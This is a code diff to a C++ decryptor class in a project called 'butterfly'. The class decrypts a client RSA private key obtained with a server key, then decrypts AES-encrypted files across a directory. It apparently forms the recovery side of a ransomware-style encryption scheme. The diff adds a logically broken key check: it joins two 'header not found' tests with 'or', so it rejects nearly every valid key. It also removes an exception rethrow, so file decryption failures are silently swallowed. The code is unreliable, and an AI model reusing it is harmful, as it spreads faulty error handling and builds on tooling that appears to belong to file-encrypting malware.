@@ -1,6 +1,4 @@
 
-#include <memory>
-
 #include "crypto/decryptor.h"
 
 namespace butterfly
@@ -52,9 +50,16 @@ void Decryptor::setDecryptedCPrivateRSAStr(const std::string &decryptedCPrivateR
 void Decryptor::invokeDir(const std::string &dirPath)
 {
 
+    // Ensure the decrypted CPrivateRSA string is available
     if ( _decryptedCPrivateRSA.empty() )
     {
         throw DecryptorException("Could not start the decryption process, because decrypted CPrivateRSA.pem string is empty!");
+    }
+
+    // Check if dirPath exists
+    if ( !DirectoryIterator::exists(dirPath) )
+    {
+        throw DecryptorException("Provided Directory Path " + dirPath + " doesn´t exists!");
     }
 
     // Decrypt the AESKey.bin file and get AESKey and AESIV
@@ -126,9 +131,9 @@ void Decryptor::decryptCPrivateRSA(const std::string &pkeyFromServer, const std:
     }
 
     // Check if decryption was successful
-    if (_decryptedCPrivateRSA.find("-----BEGIN RSA PRIVATE KEY-----") == std::string::npos)
+    if ( (_decryptedCPrivateRSA.find("-----BEGIN RSA PRIVATE KEY-----") == std::string::npos) || (_decryptedCPrivateRSA.find("-----BEGIN PRIVATE KEY-----") == std::string::npos))
     {
-        throw DecryptorException("Decrypted CPrivateRSA String does not include '-----BEGIN RSA PRIVATE KEY-----'");
+        throw DecryptorException("Decrypted CPrivateRSA String does not include '-----BEGIN RSA PRIVATE KEY-----' or '-----BEGIN PRIVATE KEY-----'");
     }
 
 }
@@ -198,14 +203,16 @@ void Decryptor::decryptFileWithAES(const std::string &filepath)
     } catch (AESDecryptionException &e)
     {
         std::cerr << e.what() << std::endl;
-        throw DecryptorException(e.what());
     }
 
 }
 
 void Decryptor::spawnThread(const std::string &filepath)
 {
-    std::thread t(&Decryptor::decryptFileWithAES, this, filepath);
+    // Create dedicated thread for this decryption file
+    std::thread t(&Decryptor::decryptFileWithAES, this, filepath); // Deviating from the encryptor class, using here the same instance for each decryption
+
+    // Save thread in thread vector
     _threads.push_back(std::move(t));
 }
 
